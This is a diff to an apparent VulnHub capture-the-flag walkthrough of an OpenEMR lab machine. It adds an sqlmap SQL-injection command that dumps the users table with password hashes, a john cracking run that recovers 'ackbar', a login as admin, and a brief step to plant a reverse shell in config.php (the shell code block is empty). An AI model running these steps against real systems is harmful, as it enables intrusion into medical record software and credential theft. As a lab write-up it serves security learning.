@@ -55,11 +55,45 @@ on this code we see that there is a vulnerable endpoint and parameter i just cop
 
 ```bash
 root@kali: sqlmap -u "http://192.168.56.135/openemr/interface/login/validateUser.php?u=" -p 'u' --batch -D openemr -T users -C username,password --dump
+
+Database: openemr
+Table: users
+[2 entries]
++----------+------------------------------------------+
+| username | password                                 |
++----------+------------------------------------------+
+| admin    | 3863efef9ee2bfbc51ecdca359c6302bed1389e8 |
+| medical  | ab24aed5a7c4ad45615cd7e0da816eea39e4895d |
++----------+------------------------------------------+
+
 ```
 
+now we can easily crack those hashes with john :
+
+```bash
+john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+Created directory: /root/.john
+Press 'q' or Ctrl-C to abort, almost any other key for status
+medical          (?)     
+ackbar           (?)     
+2g 0:00:00:00 DONE (2024-06-11 08:34) 13.33g/s 6909Kp/s 6909Kc/s 6966KC/s acl405..acjy98
+Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably
+Session completed. 
+```
+
+and yes, we can login to website with `admin:ackbar` :
 
 
+### 3.Gaining Shell
 
+
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/a1677583-2ec6-4b5f-ae91-4e5dda63db24)
+
+put your revshell in `config.php` and start a listener on your machine and you will get the shell :
+
+```bash
+
+```
 
 
 
